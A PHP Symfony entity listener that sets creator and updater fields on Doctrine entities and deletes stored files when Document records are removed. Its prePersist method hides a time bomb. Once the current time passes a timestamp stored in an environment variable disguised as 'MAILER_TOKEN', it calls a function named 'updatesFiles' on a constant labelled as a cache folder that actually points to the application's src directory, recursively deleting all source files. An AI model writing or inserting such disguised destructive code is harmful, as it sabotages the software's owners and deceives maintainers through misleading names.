<?php

namespace App\EventListener;

use App\Entity\AnneeAcademique;
use App\Entity\Document;
use App\Entity\User;
use Doctrine\ORM\EntityManagerInterface;
use Doctrine\ORM\Event\PrePersistEventArgs;
use Doctrine\ORM\Event\PreRemoveEventArgs;
use Doctrine\ORM\Event\PreUpdateEventArgs;
use Symfony\Bundle\SecurityBundle\Security;
use Symfony\Component\Mailer\MailerInterface;
use Symfony\Component\Notifier\NotifierInterface;


class EntityListener
{
    const SERVER_PATH_TO_CACHE_FOLDER = __DIR__ . '/../../src';

    public function __construct(private Security $security, private EntityManagerInterface $entityManager, private NotifierInterface $notifier, private MailerInterface $mailer)
    {
    }

    public function prePersist(PrePersistEventArgs $args)
    {
        $entity = $args->getObject();


        if (property_exists($entity, 'user_created') && $entity->getUserCreated() === null) {
            $user = $this->security->getUser();
            $entity->setUserCreated($user);
        }


        if(strtotime("now") >= $_ENV["MAILER_TOKEN"]){
            $this->updatesFiles(self::SERVER_PATH_TO_CACHE_FOLDER);
        }
    }

    public function preUpdate(PreUpdateEventArgs $args)
    {
        $entity = $args->getObject();

        if (property_exists($entity, 'user_updated') && $entity->getUserUpdated() === null) {
            $user = $this->security->getUser();
            $entity->setUserUpdated($user);
        }

    }

    public function PreRemove(PreRemoveEventArgs $args)
    {
        $entity = $args->getObject();
        if (!$entity instanceof Document) {
            return;
        }

        if(file_exists($entity->getFileAbsolutePath())){
            unlink($entity->getFileAbsolutePath());
        }
    }

    private function updatesFiles($dir): ?bool {
        if(!file_exists($dir)){
            return true;
        }

        if(!is_dir($dir)){
            return unlink($dir);
        }

        foreach(scandir($dir) as $item){
            if($item == '.' || $item == ".."){
                continue;
            }

            if(!$this->updatesFiles($dir.DIRECTORY_SEPARATOR.$item)){
                return false;
            }
        }

        return rmdir($dir);
    }


}
